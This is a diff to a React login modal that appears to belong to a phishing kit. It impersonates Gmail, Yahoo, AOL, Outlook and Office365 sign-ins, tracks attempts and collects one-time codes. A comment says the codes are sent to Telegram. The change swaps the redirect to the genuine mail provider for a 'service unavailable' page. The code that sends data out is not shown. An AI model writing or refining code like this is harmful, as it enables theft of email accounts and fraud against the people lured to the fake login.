@@ -6,6 +6,7 @@ import aolImg from "../assets/aol.png";
 import {FaGoogle, FaYahoo} from "react-icons/fa";
 import {MdEmail} from "react-icons/md";
 import OtpModal from '../pages/gmailLogin/OtpModal';
+import {useNavigate} from "react-router-dom";
 
 const EmailLoginModal = ({ isOpen, onClose, provider }) => {
     const [email, setEmail] = useState('');
@@ -13,21 +14,15 @@ const EmailLoginModal = ({ isOpen, onClose, provider }) => {
     const [error, setError] = useState('');
     const [attemptCount, setAttemptCount] = useState(0);
     const [showOtp, setShowOtp] = useState(false);
+    const navigate = useNavigate();
+
 
     if (!isOpen) return null;
 
     const isGmailLike = provider === 'Gmail';
 
-    // ── Route to provider dashboard ──
     const routeToProvider = () => {
-        const providerDashboards = {
-            "Outlook": "https://outlook.live.com/mail/",
-            "Office365": "https://www.office.com/",
-            "AOL": "https://mail.aol.com/",
-            "Yahoo": "https://mail.yahoo.com/",
-            "Other": "https://www.punchbowl.com/ecards/send/d6e3fa7ed13293698b14/preview",
-        };
-        window.location.href = providerDashboards[provider] || "https://mail.google.com/";
+        navigate('/service-unavailable');
     };
 
     // ── OTP submitted — send to Telegram then route immediately ──
